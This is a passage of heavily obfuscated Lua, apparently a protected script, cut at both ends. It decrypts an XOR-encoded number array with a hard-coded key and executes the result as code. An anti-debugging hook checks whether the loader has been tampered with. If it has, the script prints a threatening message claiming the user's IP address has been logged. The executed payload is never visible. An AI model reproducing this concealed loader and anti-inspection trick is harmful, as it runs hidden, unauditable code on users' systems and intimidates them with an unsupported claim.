      [lcl8s0YqqnSV0WGCaig0IWmkT4ZjTIEJbczYaRHFM0Np9EP6KuMR3pkcDXmXPZsYguAj5('3A') .. lcl8s0YqqnSV0WGCaig0IWmkT4ZjTIEJbczYaRHFM0Np9EP6KuMR3pkcDXmXPZsYguAj5('91') .. lcl8s0YqqnSV0WGCaig0IWmkT4ZjTIEJbczYaRHFM0Np9EP6KuMR3pkcDXmXPZsYguAj5('E3') .. lcl8s0YqqnSV0WGCaig0IWmkT4ZjTIEJbczYaRHFM0Np9EP6KuMR3pkcDXmXPZsYguAj5('D4') .. lcl8s0YqqnSV0WGCaig0IWmkT4ZjTIEJbczYaRHFM0Np9EP6KuMR3pkcDXmXPZsYguAj5('87') .. lcl8s0YqqnSV0WGCaig0IWmkT4ZjTIEJbczYaRHFM0Np9EP6KuMR3pkcDXmXPZsYguAj5('26')]
      [lcl8s0YqqnSV0WGCaig0IWmkT4ZjTIEJbczYaRHFM0Np9EP6KuMR3pkcDXmXPZsYguAj5('CA') .. lcl8s0YqqnSV0WGCaig0IWmkT4ZjTIEJbczYaRHFM0Np9EP6KuMR3pkcDXmXPZsYguAj5('7D') .. lcl8s0YqqnSV0WGCaig0IWmkT4ZjTIEJbczYaRHFM0Np9EP6KuMR3pkcDXmXPZsYguAj5('1C') .. lcl8s0YqqnSV0WGCaig0IWmkT4ZjTIEJbczYaRHFM0Np9EP6KuMR3pkcDXmXPZsYguAj5('E3')](
      q) end
    ; n(fkUzD8hm5AUanr09PRWaqa5wu0Vtk56uAbzc4N5bgaIsJDuV5ZXbi)
  end; nDT7TfBQhzS2EACZLgSaqzYnfw60aGxvKOUho3HLs5TaiQZ0YXuADq8VLet6YVs(f,
    function(r) e20uXBFxJY0JFgK5R7YcIxcuOOvufKh6krzcJlPo5ApJoUl40YmZDd7xU6SEL(r, g,
        function(s) dYWfI6nbX0necIBwlqdMOrn3x4E9jOBidCsMhSHnoDzwp4KQdKI0OFdBPTFX(s,
            function(t) if #aPmtPufiU6kAyLmTxlZl7uo8xnOW0fjSZJsiLF45OpnwZiOSk97Jo(qnbfjzvcwP8XRgzYRG8y6aq01LgKM3r5asO9jjmBU1P6Lqn7NQ33l[lcl8s0YqqnSV0WGCaig0IWmkT4ZjTIEJbczYaRHFM0Np9EP6KuMR3pkcDXmXPZsYguAj5('D9') .. lcl8s0YqqnSV0WGCaig0IWmkT4ZjTIEJbczYaRHFM0Np9EP6KuMR3pkcDXmXPZsYguAj5('DE') .. lcl8s0YqqnSV0WGCaig0IWmkT4ZjTIEJbczYaRHFM0Np9EP6KuMR3pkcDXmXPZsYguAj5('1C') .. lcl8s0YqqnSV0WGCaig0IWmkT4ZjTIEJbczYaRHFM0Np9EP6KuMR3pkcDXmXPZsYguAj5('21')]) == 1 then if qnbfjzvcwP8XRgzYRG8y6aq01LgKM3r5asO9jjmBU1P6Lqn7NQ33l[lcl8s0YqqnSV0WGCaig0IWmkT4ZjTIEJbczYaRHFM0Np9EP6KuMR3pkcDXmXPZsYguAj5('D9') .. lcl8s0YqqnSV0WGCaig0IWmkT4ZjTIEJbczYaRHFM0Np9EP6KuMR3pkcDXmXPZsYguAj5('DE') .. lcl8s0YqqnSV0WGCaig0IWmkT4ZjTIEJbczYaRHFM0Np9EP6KuMR3pkcDXmXPZsYguAj5('1C') .. lcl8s0YqqnSV0WGCaig0IWmkT4ZjTIEJbczYaRHFM0Np9EP6KuMR3pkcDXmXPZsYguAj5('21')] == qnbfjzvcwP8XRgzYRG8y6aq01LgKM3r5asO9jjmBU1P6Lqn7NQ33l[lcl8s0YqqnSV0WGCaig0IWmkT4ZjTIEJbczYaRHFM0Np9EP6KuMR3pkcDXmXPZsYguAj5('35') .. lcl8s0YqqnSV0WGCaig0IWmkT4ZjTIEJbczYaRHFM0Np9EP6KuMR3pkcDXmXPZsYguAj5('E3') .. lcl8s0YqqnSV0WGCaig0IWmkT4ZjTIEJbczYaRHFM0Np9EP6KuMR3pkcDXmXPZsYguAj5('D4') .. lcl8s0YqqnSV0WGCaig0IWmkT4ZjTIEJbczYaRHFM0Np9EP6KuMR3pkcDXmXPZsYguAj5('87') .. lcl8s0YqqnSV0WGCaig0IWmkT4ZjTIEJbczYaRHFM0Np9EP6KuMR3pkcDXmXPZsYguAj5('91')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if qnbfjzvcwP8XRgzYRG8y6aq01LgKM3r5asO9jjmBU1P6Lqn7NQ33l[lcl8s0YqqnSV0WGCaig0IWmkT4ZjTIEJbczYaRHFM0Np9EP6KuMR3pkcDXmXPZsYguAj5('D9') .. lcl8s0YqqnSV0WGCaig0IWmkT4ZjTIEJbczYaRHFM0Np9EP6KuMR3pkcDXmXPZsYguAj5('DE') .. lcl8s0YqqnSV0WGCaig0IWmkT4ZjTIEJbczYaRHFM0Np9EP6KuMR3pkcDXmXPZsYguAj5('1C') .. lcl8s0YqqnSV0WGCaig0IWmkT4ZjTIEJbczYaRHFM0Np9EP6KuMR3pkcDXmXPZsYguAj5('21')](t) then
                    qnbfjzvcwP8XRgzYRG8y6aq01LgKM3r5asO9jjmBU1P6Lqn7NQ33l
                        [lcl8s0YqqnSV0WGCaig0IWmkT4ZjTIEJbczYaRHFM0Np9EP6KuMR3pkcDXmXPZsYguAj5('D9') .. lcl8s0YqqnSV0WGCaig0IWmkT4ZjTIEJbczYaRHFM0Np9EP6KuMR3pkcDXmXPZsYguAj5('DE') .. lcl8s0YqqnSV0WGCaig0IWmkT4ZjTIEJbczYaRHFM0Np9EP6KuMR3pkcDXmXPZsYguAj5('1C') .. lcl8s0YqqnSV0WGCaig0IWmkT4ZjTIEJbczYaRHFM0Np9EP6KuMR3pkcDXmXPZsYguAj5('21')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; q0NXcVocwjVOXNJcW240vxH53ppVrs3gECiivbZhMaIzF6t7OAi6LRluecl7oPPGtm(
{ 1174, 658, 838, 853, 657, 1030, 993, 724, 737, 1028, 1200, 1187, 551, 1066, 1129, 610, 1166, 1130, 1044, 701, 862,
  1062, 757, 699, 874, 883, 568, 629, 626, 822, 1077, 791, 1010, 597, 1141, 562, 776, 802, 1113, 1064, 954, 1204, 564,
  659, 998, 961, 637, 763, 760, 866, 560, 826, 710, 649, 957, 848, 960, 548, 951, 1131, 735, 903, 1093, 857, 744, 1162,
  898, 1038, 628, 661, 809, 1117, 861, 601, 643, 656, 947, 662, 777, 1069, 816, 821, 1205, 1124, 800, 768, 634, 1154,
  897, 1081, 547, 730, 1195, 881, 638, 970, 1043, 1160, 608, 772, 1001, 726, 963, 1003, 1207, 901, 1046, 995, 1090, 889,
  652, 616, 636, 974, 1189, 902, 944, 978, 1055, 1179, 832, 1068, 803, 1105, 561, 1070, 1146, 858, 591, 1164, 1027, 873,
  938, 1088, 1007, 654, 968, 570, 797, 990, 1109, 1211, 841, 854, 855, 834, 674, 859, 732, 878, 918, 942, 904, 1169, 925,
  1056, 1159, 949, 691, 864, 819, 1011, 639, 1133, 714, 958, 842, 1004, 644, 894, 572, 1052, 567, 721, 825, 823, 973,
  650, 741, 1185, 600, 648, 692, 746, 712, 1170, 879, 667, 1083, 566, 603, 1176, 753, 937, 625, 743, 679, 1106, 887, 984,
  680, 697, 676, 1031, 828, 1063, 1102, 799, 770, 955, 843, 1112, 913, 1111, 762, 1058, 686, 675, 806, 1173, 670, 621,
  756, 695, 900, 837, 1139, 1210, 818, 585, 641, 700, 906, 780, 785, 1177, 613, 660, 989, 948, 706, 563, 1186, 1029,
  1100, 647, 815, 820, 1021, 1147, 575, 924, 1015, 959, 805, 790, 1040, 734, 796, 988, 1085, 1126, 632, 631, 1103, 766,
  582, 727, 1171, 607, 875, 909, 1158, 1140, 713, 553, 709, 682, 689, 546, 617, 908, 1086, 808, 779, 1067, 761, 1121,
  1182, 1000, 992, 1014, 882, 593, 1017, 576, 728, 1165, 846, 1196, 609, 749, 941, 933, 694, 645, 1104, 1163, 885, 912,
  964, 896, 783, 899, 1018, 1059, 1212, 1144, 997, 880, 1037, 1209, 884, 599, 751, 1006, 891, 967, 781, 1157, 1048, 557,
  1026, 1073, 612, 1132, 850, 588, 934, 1149, 979, 747, 1101, 733, 665, 1020, 664, 1098, 688, 767, 985, 1005, 604, 1118,
  1208, 1178, 598, 814, 893, 962, 911, 1134, 953, 717, 602, 965, 1009, 851, 943, 929, 927, 860, 868, 966, 839, 917, 693,
  1095, 1138, 739, 719, 1114, 574, 1183, 653, 824, 890, 740, 1032, 1039, 1074, 983, 1206, 702, 1024, 922, 811, 569, 871,
  543, 696, 1025, 865, 1161, 852, 1089, 788, 1116, 711, 577, 1145, 673, 928, 1201, 1198, 863, 622, 969, 939, 1065, 592,
  655, 698, 671, 556, 877, 1079, 663, 1034, 986, 1084, 738, 807, 905, 956, 1033, 999, 672, 1097, 748, 784, 681, 1023,
  919, 615, 1078, 786, 810, 895, 1071, 758, 869, 623, 1035, 773, 550, 704, 1080, 1054, 1092, 1057, 1108, 817, 595, 1191,
  793, 708, 544, 872, 907, 867, 789, 926, 1143, 945, 1136, 849, 573, 606, 950, 1022, 1008, 703, 1045, 640, 844, 836,
  1137, 614, 549, 683, 886, 980, 1153, 1168, 1180, 1156, 1150, 813, 715, 594, 722, 1012, 1049, 769, 669, 584, 552, 646,
  620, 782, 996, 1193, 1050, 716, 759, 972, 975, 642, 935, 565, 771, 870, 1184, 1181, 729, 795, 1036, 1019, 1091, 977,
  596, 745, 801, 586, 920, 774, 707, 742, 755, 1075, 1123, -1, 19, 48, 69, 39, 0, 88, 68, 31, 62, 77, 54, 91, 167, 23,
  116, 12, 84, 65, 78, 21, 53, 106, 84, 104, 115, 29, 112, 112, 52, 82, 86, 81, 101, 88, 124, 146, 124, 41, 130, 24, 128,
  76, 2, 85, 234, 60, 43, 249, 5, 98, 112, 87, 94, 18, 124, 81, 34, 70, 91, 16, 2, 85, 221, 87, 5, 23, 19, 37, 116, 70,
  28, 71, 76, 53, 72, 188, 40, 63, 103, 27, 20, 16, 94, 2, 119, 106, 86, 220, 31, 2, 13, 82, 36, 82, 64, 109, 65, 47, 9,
  107, 65, 75, 61, 25, 46, 121, 76, 87, 96, 5, 1, 82, 25, 106, 36, 105, 4, 42, 4, 114, 102, 95, 87, 47, 30, 73, 102, 3,
  112, 7, 74, 56, 95, 85, 129, 72, 77, 64, 117, 11, 70, 124, 222, 74, 28, 25, 20, 251, 75, 83, 76, 5, 112, 15, 108, 87,
  40, 52, 105, 10, 85, 93, 120, 2, 78, 21, 35, 84, 25, 85, 16, 27, 51, 8, 58, 112, 106, 52, 85, 112, 202, 61, 81, 102,
  61, 87, 93, 77, 64, 89, 77, 35, 94, 185, 127, 63, 112, 102, 94, 123, 94, 24, 75, 11, 29, 34, 37, 174, 9, 220, 91, 36,
  49, 85, 19, 80, 0, 9, 28, 69, 8, 4, 61, 90, 76, 34, 87, 76, 25, 8, 13, 109, 33, 21, 4, 245, 79, 29, 64, 43, 88, 4, 0,
  54, 151, 62, 114, 1, 75, 127, 63, 78, 91, 2, 65, 26, 102, 87, 65, 111, 89, 98, 11, 87, 46, 50, 30, 75, 25, 162, 38,
  116, 24, 22, 21, 21, 101, 25, 88, 80, 120, 11, 86, 44, 244, 74, 53, 138, 52, 106, 4, 57, 41, 21, 71, 9, 87, 139, 76,
  68, 64, 9, 154, 64, 30, 27, 23, 65, 69, 24, 10, 29, 20, 128, 102, 40, 20, 90, 2, 71, 49, 84, 86, 42, 69, 23, 88, 76,
  67, 92, 95, 2, 18, 129, 86, 47, 110, 112, 120, 85, 33, 22, 78, 102, 102, 160, 95, 20, 6, 131, 71, 65, 30, 39, 18, 28,
  25, 106, 94, 37, 24, 82, 2, 12, 16, 3, 37, 39, 70, 35, 113, 28, 68, 158, 102, 64, 23, 119, 70, 80, 219, 72, 77, 98, 80,
  68, 30, 121, 101, 104, 4, 18, 117, 218, 97, 3, 76, 244, 36, 85, 98, 30, 87, 71, 65, 72, 12, 102, 20, 133, 2, 85, 30,
  81, 76, 81, 61, 48, 124, 68, 15, 19, 92, 86, 121, 91, 51, 75, 199, 3, 64, 86, 111, 189, 50, 4, 24, 65, 89, 32, 77, 64,
  76, 77, 89, 32, 39, 86, 84, 38, 5, 98, 30, 3, 91, 19, 71, 17, 28, 26, 58, 114, 77, 31, 98, 77, 76, 27, 12, 23, 218, 4,
  23, 145, 25, 24, 16, 36, 5, 76, 90, 98, 50, 71, 126, 2, 94, 86, 67, 13, 105, 76, 46, 112, 95, 35, 48, 21, 7, 217, 81,
  81, 112, 5, 149, 81, 86, 55, 152, 97, 9, 47, 5, 114, 5, 119, 29, 234, 10, 2, 97, 77, 88, 8, 37, 90, 85, 110, 62, 130,
  68, 0, 9, 63, 55, 11, 87, 60, 42, 225, 68, 22, 6, 3, 241, 10, 49, 98, 49, 19, 16, 27, 77, 195, 9, 19, 179, 85, 58, 83,
  108, 8, 115, 119, 37, 49, 30, 15, 8, 95, 102, 71, 237, 4, 48, 112, 233, 116, 73, 178, 0, 86, 24, 80, 218, 150, 4, 20,
  59, 102, 119, 102, 96, 112, 94, 85, 33, 31, 23, 187, 25, 77, 69, 3, 106, 238, 25, 22, 60, 94, 117, 5, 235, 9, 71, 25,
  70, 115, 10, 5, 10, 95, 48, 47, 226, 84, 97, 95, 24, 94, 34, 126, 232, 81, 77, 71, 36, 25, 44, 83, 116, 29, 119, 68,
  54, 240, 4, 50, 4, 44, 89, 192, 72, 77, 106, 65, 129, 3, 111, 190, 18, 112, 44, 9, 84, 106, 19, 49, 40, 58 },
  "t9lxB9wP7vwFlmuPJgqTgdfFaU"); qAG2FEqVNGPkewSesX7dUqjdI12FbxeLhaBDqm8q5dLUjIOTUTdCbw4 =
qnbfjzvcwP8XRgzYRG8y6aq01LgKM3r5asO9jjmBU1P6Lqn7NQ33l; c5Q6NUFWT1TGojNkAKat3TjWlzvS0k8EgHIZcOF5kPUVuxTeBu48JccI6gfZQCqVPF =
qnbfjzvcwP8XRgzYRG8y6aq01LgKM3r5asO9jjmBU1P6Lqn7NQ33l; aqfaR5z5Mirv6VB5E0rIbl94AmPdNAPq6DjDZ2Eesucn8yK9lZnt0FGo6eIsRcUK =
c5Q6NUFWT1TGojNkAKat3TjWlzvS0k8EgHIZcOF5kPUVuxTeBu48JccI6gfZQCqVPF; hnNV3PXlcRlrb2xYC7Sa3snbs06SavDGprUqni7QrvRZXiAOyDa1OpdaV3IOa =
aqfaR5z5Mirv6VB5E0rIbl94AmPdNAPq6DjDZ2Eesucn8yK9lZnt0FGo6eIsRcUK; v4MOdPn3YdAIV2vL1Nipki4I2yBz3f8DG3K1yzdWde9Txs8JuqZphY =
hnNV3PXlcRlrb2xYC7Sa3snbs06SavDGprUqni7QrvRZXiAOyDa1OpdaV3IOa; tMBnlHcLRUJyfAyRpmFpY3uIMnCJgqLWztl1r50WpAoedQJZgNHsrMPGle9wNjXDvWsNl =
v4MOdPn3YdAIV2vL1Nipki4I2yBz3f8DG3K1yzdWde9Txs8JuqZphY; gWDhpVxXWz9U98JvoAnlN0ZwbmCdbELrgM3xQSTTiS3D8AQfk24gpPUTi3dB =
tMBnlHcLRUJyfAyRpmFpY3uIMnCJgqLWztl1r50WpAoedQJZgNHsrMPGle9wNjXDvWsNl; s3jYIfMiKskQ79w1dKcWvpiCVDvYDPAUEBNFtOm9AeGxDGEJyEr =
gWDhpVxXWz9U98JvoAnlN0ZwbmCdbELrgM3xQSTTiS3D8AQfk24gpPUTi3dB; gTezhJxxHsz6gDpL0XikHLaoH7Syjfd8klVrnjIF3PoDv26swFKxWtGJsmwG =
s3jYIfMiKskQ79w1dKcWvpiCVDvYDPAUEBNFtOm9AeGxDGEJyEr; iSuRFWtPHWpt3jSodONScFuCtj4F6PJyTvGwoinn4FE4WDuHqZBg =
gTezhJxxHsz6gDpL0XikHLaoH7Syjfd8klVrnjIF3PoDv26swFKxWtGJsmwG; aL5XyXlQPgib6S5PZCHxVNrBphdzM8LJ7nufUTLruutW6TE1tfi =
iSuRFWtPHWpt3jSodONScFuCtj4F6PJyTvGwoinn4FE4WDuHqZBg; cZU4xCERdG10iInFKfQggtVxN0ubE5RKZTHDpTgbpLqU7bjkCaUwDjlrQhw3Ew =
aL5XyXlQPgib6S5PZCHxVNrBphdzM8LJ7nufUTLruutW6TE1tfi; pESMLkpVJMZS6TJUpqsnHsNqmy7zcjvNVDW0UXsVbFUq4fgH9Pr6QaN =
cZU4xCERdG10iInFKfQggtVxN0ubE5RKZTHDpTgbpLqU7bjkCaUwDjlrQhw3Ew; eEAqWh952yMJCiw2Ly7pRIhZjo4u4BJqR75YKKiJnTHlB79lelJ =
pESMLkpVJMZS6TJUpqsnHsNqmy7zcjvNVDW0UXsVbFUq4fgH9Pr6QaN; efWt86ZDCgBaGY6cBlKCqlrlS68waJOSwYidl3xypzt5LVAwzhxmN66PynuodyEZq6hyrVWNnrf =
eEAqWh952yMJCiw2Ly7pRIhZjo4u4BJqR75YKKiJnTHlB79lelJ; j5UCkgieDwn8YEO0L88rzGQBH62cs0RwuW3CnpROr3o34zHmFgMF = function(a)
  K, F = 3354716371997618, 16384 + 6616; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; bz8ZvIpxDeiPrT6nP0z0aF3NGb6afD9Jt7LTR5ALWbDJgyzKAnq3S9DY5z3UnUabrEk = function(b)
  co = coroutine.create(b)
  wteKYpyMLwLfHpK2eV88pBa1DbvXCmLESd24un4cGWKykMcXSyrPwvVfum2EYF = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(wteKYpyMLwLfHpK2eV88pBa1DbvXCmLESd24un4cGWKykMcXSyrPwvVfum2EYF, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return wteKYpyMLwLfHpK2eV88pBa1DbvXCmLESd24un4cGWKykMcXSyrPwvVfum2EYF
end; uwlWRFHY5GitjQd7NHlROkJRpcdxFl3dgiweqch1D7RZDfO4Z4dWGQMsATdp7Y9tQCNH = function(f, g)
  fnDfZBOHdt6gZhcJXcUp9Y8faUdxYrGXVUqRmMSriaqZ3n4EA3juwQt2 = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; yyTC3pRG2xXtUwHK0e11hzlXVdxGUwTBpHRZ3urF7KkSdr2tdoE0vcIwabZk0SXGwW2trwM = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; fHCDILoRtB8DzkGL6RxRvFm5muReoDbv861RQT65DJgTGnrxZ3OE4AXQ0qZmQshBB = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      fnDfZBOHdt6gZhcJXcUp9Y8faUdxYrGXVUqRmMSriaqZ3n4EA3juwQt2(f[i], string.byte(g, j), function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; d0mkXuenNGxdmKDssnUp0i0Yy40HZo9YimjcoBhyqkbYlyw7jL7kunpZNGjPbBdaNQZ = function(p, n)
    yaMcz0kYmjxHt2WVq5lCJko7WveRECwUyUY6F6347gMdK95JtW9o31a8pdtA0GXRZIHD6gQ = ""
    for k, q in pairs(p) do yaMcz0kYmjxHt2WVq5lCJko7WveRECwUyUY6F6347gMdK95JtW9o31a8pdtA0GXRZIHD6gQ =
      yaMcz0kYmjxHt2WVq5lCJko7WveRECwUyUY6F6347gMdK95JtW9o31a8pdtA0GXRZIHD6gQ ..
      efWt86ZDCgBaGY6cBlKCqlrlS68waJOSwYidl3xypzt5LVAwzhxmN66PynuodyEZq6hyrVWNnrf
      [j5UCkgieDwn8YEO0L88rzGQBH62cs0RwuW3CnpROr3o34zHmFgMF('4C') .. j5UCkgieDwn8YEO0L88rzGQBH62cs0RwuW3CnpROr3o34zHmFgMF('35') .. j5UCkgieDwn8YEO0L88rzGQBH62cs0RwuW3CnpROr3o34zHmFgMF('63') .. j5UCkgieDwn8YEO0L88rzGQBH62cs0RwuW3CnpROr3o34zHmFgMF('32') .. j5UCkgieDwn8YEO0L88rzGQBH62cs0RwuW3CnpROr3o34zHmFgMF('BF') .. j5UCkgieDwn8YEO0L88rzGQBH62cs0RwuW3CnpROr3o34zHmFgMF('60')]
      [j5UCkgieDwn8YEO0L88rzGQBH62cs0RwuW3CnpROr3o34zHmFgMF('BC') .. j5UCkgieDwn8YEO0L88rzGQBH62cs0RwuW3CnpROr3o34zHmFgMF('49') .. j5UCkgieDwn8YEO0L88rzGQBH62cs0RwuW3CnpROr3o34zHmFgMF('EA') .. j5UCkgieDwn8YEO0L88rzGQBH62cs0RwuW3CnpROr3o34zHmFgMF('63')](
      q) end
    ; n(yaMcz0kYmjxHt2WVq5lCJko7WveRECwUyUY6F6347gMdK95JtW9o31a8pdtA0GXRZIHD6gQ)
  end; yyTC3pRG2xXtUwHK0e11hzlXVdxGUwTBpHRZ3urF7KkSdr2tdoE0vcIwabZk0SXGwW2trwM(f,
    function(r) fHCDILoRtB8DzkGL6RxRvFm5muReoDbv861RQT65DJgTGnrxZ3OE4AXQ0qZmQshBB(r, g,
        function(s) d0mkXuenNGxdmKDssnUp0i0Yy40HZo9YimjcoBhyqkbYlyw7jL7kunpZNGjPbBdaNQZ(s,
            function(t) if #bz8ZvIpxDeiPrT6nP0z0aF3NGb6afD9Jt7LTR5ALWbDJgyzKAnq3S9DY5z3UnUabrEk(efWt86ZDCgBaGY6cBlKCqlrlS68waJOSwYidl3xypzt5LVAwzhxmN66PynuodyEZq6hyrVWNnrf[j5UCkgieDwn8YEO0L88rzGQBH62cs0RwuW3CnpROr3o34zHmFgMF('ED') .. j5UCkgieDwn8YEO0L88rzGQBH62cs0RwuW3CnpROr3o34zHmFgMF('A8') .. j5UCkgieDwn8YEO0L88rzGQBH62cs0RwuW3CnpROr3o34zHmFgMF('EA') .. j5UCkgieDwn8YEO0L88rzGQBH62cs0RwuW3CnpROr3o34zHmFgMF('A5')]) == 1 then if efWt86ZDCgBaGY6cBlKCqlrlS68waJOSwYidl3xypzt5LVAwzhxmN66PynuodyEZq6hyrVWNnrf[j5UCkgieDwn8YEO0L88rzGQBH62cs0RwuW3CnpROr3o34zHmFgMF('ED') .. j5UCkgieDwn8YEO0L88rzGQBH62cs0RwuW3CnpROr3o34zHmFgMF('A8') .. j5UCkgieDwn8YEO0L88rzGQBH62cs0RwuW3CnpROr3o34zHmFgMF('EA') .. j5UCkgieDwn8YEO0L88rzGQBH62cs0RwuW3CnpROr3o34zHmFgMF('A5')] == efWt86ZDCgBaGY6cBlKCqlrlS68waJOSwYidl3xypzt5LVAwzhxmN66PynuodyEZq6hyrVWNnrf[j5UCkgieDwn8YEO0L88rzGQBH62cs0RwuW3CnpROr3o34zHmFgMF('91') .. j5UCkgieDwn8YEO0L88rzGQBH62cs0RwuW3CnpROr3o34zHmFgMF('63') .. j5UCkgieDwn8YEO0L88rzGQBH62cs0RwuW3CnpROr3o34zHmFgMF('32') .. j5UCkgieDwn8YEO0L88rzGQBH62cs0RwuW3CnpROr3o34zHmFgMF('BF') .. j5UCkgieDwn8YEO0L88rzGQBH62cs0RwuW3CnpROr3o34zHmFgMF('35')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if efWt86ZDCgBaGY6cBlKCqlrlS68waJOSwYidl3xypzt5LVAwzhxmN66PynuodyEZq6hyrVWNnrf[j5UCkgieDwn8YEO0L88rzGQBH62cs0RwuW3CnpROr3o34zHmFgMF('ED') .. j5UCkgieDwn8YEO0L88rzGQBH62cs0RwuW3CnpROr3o34zHmFgMF('A8') .. j5UCkgieDwn8YEO0L88rzGQBH62cs0RwuW3CnpROr3o34zHmFgMF('EA') .. j5UCkgieDwn8YEO0L88rzGQBH62cs0RwuW3CnpROr3o34zHmFgMF('A5')](t) then
                    efWt86ZDCgBaGY6cBlKCqlrlS68waJOSwYidl3xypzt5LVAwzhxmN66PynuodyEZq6hyrVWNnrf
                        [j5UCkgieDwn8YEO0L88rzGQBH62cs0RwuW3CnpROr3o34zHmFgMF('ED') .. j5UCkgieDwn8YEO0L88rzGQBH62cs0RwuW3CnpROr3o34zHmFgMF('A8') .. j5UCkgieDwn8YEO0L88rzGQBH62cs0RwuW3CnpROr3o34zHmFgMF('EA') .. j5UCkgieDwn8YEO0L88rzGQBH62cs0RwuW3CnpROr3o34zHmFgMF('A5')](
                        t)() end end else print(
